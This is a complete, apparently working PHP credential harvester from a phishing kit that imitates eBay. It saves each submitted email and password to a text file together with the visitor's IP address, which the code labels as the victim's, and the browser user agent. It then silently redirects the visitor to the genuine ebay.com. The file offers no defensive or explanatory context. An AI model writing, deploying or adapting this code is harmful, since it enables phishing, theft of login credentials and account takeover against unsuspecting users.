<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else{
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }

$browser = $_SERVER['HTTP_USER_AGENT'];
$info = "Victim Public IP: " . $ipaddress . "\n" . "User-Agent: " . $browser;

$file = 'user.txt';
file_put_contents($file, "\n[EMAIL]: " . $_POST['userid'] . "\t[PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
$fp = fopen($file, 'a');
fwrite($fp, $info . "\n");
fclose($fp);

header('Location: https://www.ebay.com/');

?>
